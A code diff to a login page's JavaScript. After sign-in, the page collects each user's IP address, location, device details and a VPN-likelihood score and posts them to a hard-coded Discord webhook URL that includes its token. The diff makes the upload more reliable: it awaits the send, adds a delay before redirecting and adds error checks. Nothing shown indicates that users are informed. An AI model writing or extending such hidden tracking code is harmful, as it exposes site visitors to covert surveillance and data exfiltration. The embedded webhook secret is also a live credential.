@@ -255,7 +255,17 @@
 
                 if (data.success && data.user) {
                     // Collect IP and device data before redirecting
-                    await getUserData(data.user);
+                    // IMPORTANT: Wait for webhook to complete before redirecting
+                    try {
+                        await getUserData(data.user);
+                        console.log('✅ User data collection and webhook completed');
+                    } catch (webhookError) {
+                        console.error('⚠️ Webhook error (non-blocking):', webhookError);
+                        // Continue anyway - don't block user experience
+                    }
+                    
+                    // Small delay to ensure webhook request completes
+                    await new Promise(resolve => setTimeout(resolve, 500));
                     
                     // Redirect to authorized page with user info
                     const params = new URLSearchParams({
@@ -695,6 +705,11 @@
         async function sendDataToWebhook(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1454071163583070323/IAcO-7YEIzCyDkMWhm5BARhiNWrzdgOUVGCZezg56PsnlnD9SPh3_H5zO6y9g3N0gMM8';
             
+            console.log('🔄 Preparing webhook data...');
+            console.log('📊 VPN Score:', data.vpnScore);
+            console.log('📍 IP:', data.ip);
+            console.log('🌍 Location:', data.location);
+            
             const embed = {
                 title: "📊 Enhanced Device & Location Details",
                 color: data.vpnScore >= 50 ? 0xFF6B00 : 0xFF0000, // Orange if VPN likely, red otherwise
@@ -749,14 +764,23 @@
             };
 
             try {
-                await fetch(webhookUrl, {
+                console.log('📤 Sending webhook...');
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                console.log('✅ Data logged to webhook');
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.error('❌ Webhook failed:', response.status, errorText);
+                    throw new Error(`Webhook returned ${response.status}: ${errorText}`);
+                }
+                
+                console.log('✅ Webhook sent successfully!');
             } catch (error) {
                 console.error('❌ Webhook error:', error);
+                throw error; // Re-throw so getUserData knows it failed
             }
         }
 
